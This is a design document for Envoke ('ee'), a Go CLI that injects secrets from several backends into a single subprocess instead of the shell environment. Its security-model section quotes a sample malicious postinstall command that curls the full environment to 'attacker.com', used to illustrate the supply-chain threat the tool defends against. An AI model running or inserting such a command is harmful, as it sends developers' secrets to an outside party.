# Envoke — Design Document

**Command:** `ee`
**Language:** Go
**Binary:** single static binary, cross-compiles to Windows/macOS/Linux

---

## Problem

Secrets management for local development is broken:

- `.env` files get committed accidentally
- `.env.example` files go stale immediately
- Every developer has a different setup
- Secrets are loaded globally into the shell environment, exposing them to every process — including every package you install
- `envchain` (the closest prior art) is macOS/Linux only, supports one backend, and one namespace per invocation

Onboarding is an archaeology project. Supply chain attacks increasingly exploit the fact that secrets are ambient in the developer environment.

---

## Core Concept

Secrets are injected **per command**, not loaded globally. Envoke reads a project dotfile, fetches the required secrets from one or more backends, and spawns your command as a subprocess with those secrets in its environment. Nothing persists. Nothing leaks sideways.

```
$ ee -- make dev
$ ee -- psql -h $DB_HOST -U $DB_USER
$ ee -- aider --model claude-sonnet-4-6
```

The project dotfile (`.envoke`) is committed to git. It contains no secrets — only the *shape* of the environment: which namespaces are needed and which backend holds them.

---

## The Dotfile

`.envoke` lives in the project root and is committed to git:

```toml
[[namespace]]
name = "aws-dev"
backend = "keeper"

[[namespace]]
name = "db-local"
backend = "keychain"

[[namespace]]
name = "stripe-test"
backend = "jumpcloud"
```

No secrets. Safe to commit, useful to review in PRs.

### Config layering

```
~/.config/envoke/config.toml    ← your backends, your credentials  (gitignored)
<project>/.envoke               ← what this project needs           (committed)
<project>/.envoke.local         ← your personal overrides           (gitignored)
```

The global config describes *how* to reach backends. The dotfile describes *what* the project needs. A Windows dev and a Mac dev share the same `.envoke`; their global configs differ.

---

## Backends

Backends implement a single interface:

```go
type Backend interface {
    Get(namespace, key string) (string, error)
    Set(namespace, key, value string) error
    List(namespace string) ([]string, error)
}
```

### Implemented

| Backend | Platform | Notes |
|---|---|---|
| `keychain` | Windows, macOS, Linux | Credential Manager / Keychain / Secret Service via `99designs/keyring` |
| `aws` | All | AWS Secrets Manager; keys stored as JSON fields in one secret per namespace |
| `1password` | All | 1Password Secrets Manager SDK; read-only via service account token |

### Planned / Stub

| Backend | Notes |
|---|---|
| `keeper` | Keeper Secrets Manager — stub, not yet implemented |
| `jumpcloud` | JumpCloud Password Manager — stub, not yet implemented |
| `sops` | Encrypted files in git |
| `vault` | HashiCorp Vault |

Backend access is protected by whatever the backend enforces — Touch ID, Face ID, MFA, hardware tokens. Envoke inherits this for free.

---

## Security Model

### Per-command injection

Secrets are never in the ambient shell environment. They exist only in the subprocess spawned by `ee`. A compromised dependency, build script, or background process cannot read them.

### Supply chain attack surface

A malicious `postinstall` script that runs `curl attacker.com -d "$(env)"` gets nothing useful — because the secrets were never in the environment to begin with. This is the primary threat model Envoke addresses versus `.env`/`direnv` approaches.

### Agent isolation

AI coding agents (`aider`, `claude`, etc.) can be run via `ee` without ever touching the secret store directly. The agent reads `$DB_HOST` from its environment like any other program. It never authenticates to Keeper or JumpCloud. The blast radius for a compromised agent is limited to the process lifetime.

---

## Commands

### `ee -- <command>`

Run a command with secrets injected from the project's `.envoke` file.

### `ee init`

Interactive setup wizard. Detects available backends, walks through namespace configuration, and writes `.envoke`. Replaces hand-editing TOML from scratch.

### `ee status`

Dashboard showing the current project's environment state:

```
Namespace       Backend     Status
──────────────────────────────────
aws-dev         keeper      ✓ authenticated
db-local        keychain    ✓ unlocked
stripe-test     jumpcloud   ✗ token expired
```

Selecting a row allows re-authentication or key inspection.

### `ee run` (interactive)

If run without arguments in a project with multiple profiles (e.g. `dev`, `staging`), displays a fuzzy picker to select which profile to activate.

### `ee edit`

Browse, add, update, and delete keys in a namespace without values appearing in shell history. A minimal secret manager TUI scoped to the current project.

---

## TUI

Built with **Bubble Tea** (charmbracelet). Components from `bubbles` (list, table, textinput, spinner). Styling via `lipgloss`. All TUI features degrade gracefully to plain output in non-interactive environments (CI, piped output).

---

## Implementation Notes

- `BurntSushi/toml` for dotfile parsing
- `99designs/keyring` for OS keychain abstraction
- Keeper and JumpCloud have official Go SDKs
- `cobra` for CLI structure
- Single binary, no runtime dependency, cross-compiles from any machine

---

## This Is a Team Primitive

`envchain` is a personal productivity tool. Envoke is a team contract.

The committed dotfile makes secret management visible and reviewable. New developers clone the repo, run `ee -- make dev`, and it works. No "ask someone which env vars you need." No stale `.env.example` to maintain. The secret surface is auditable in pull requests.
